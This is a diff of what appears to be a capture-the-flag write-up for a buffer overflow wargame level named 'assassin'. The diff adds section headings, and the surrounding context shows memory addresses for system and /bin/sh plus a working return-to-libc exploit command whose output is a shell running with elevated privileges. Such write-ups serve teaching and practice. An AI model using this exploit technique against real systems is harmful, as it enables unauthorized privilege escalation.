@@ -50,6 +50,10 @@ main(int argc, char *argv[])
 }
 ```
 
+-----
+
+### 0x01. Analysis
+
 ```assembly
 Dump of assembler code for function main:
 0x8048470 <main>:		push   %ebp
@@ -125,7 +129,9 @@ system = 0x40058ae0
 
 /bin/sh = 0x400fbff9
 
+-----
 
+### 0x02. Exploit
 
 ```sh
 [giant@localhost giant]$ ./assassin `python -c 'print "A"*44+"\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"'`
@@ -137,6 +143,5 @@ bash$ id
 uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
 ```
 
+-----
 
-
-##### **assassin / pushing me away**
